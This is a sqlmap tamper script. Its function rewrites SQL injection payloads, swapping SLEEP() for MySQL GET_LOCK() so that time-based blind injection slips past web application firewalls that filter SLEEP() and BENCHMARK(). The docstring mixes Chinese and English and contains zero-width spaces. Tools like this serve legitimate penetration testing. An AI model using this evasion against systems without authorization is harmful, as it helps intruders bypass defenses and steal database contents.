#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    '\n    Replaces instances like \'SLEEP(5)\' with (e.g.) "GET_LOCK(\'ETgP\',5)"\n\n    Requirement:\n        * MySQL\n\n    测试针对：\n        * MySQL 5.0 和 5.5\n\n    Notes:\n        * 可用于绕过非常薄弱的\u200b\u200b定制 Web 应用程序防火墙\n          that filter the SLEEP() and BENCHMARK() functions\n\n        * 参考号：https://zhuanlan.zhihu.com/p/35245598\n\n    >>> tamper(\'SLEEP(5)\') == "GET_LOCK(\'%s\',5)" % kb.aliasName\n    True\n    '

    if payload:
        payload = payload.replace("SLEEP(", "GET_LOCK('%s'," % kb.aliasName)

    return payload
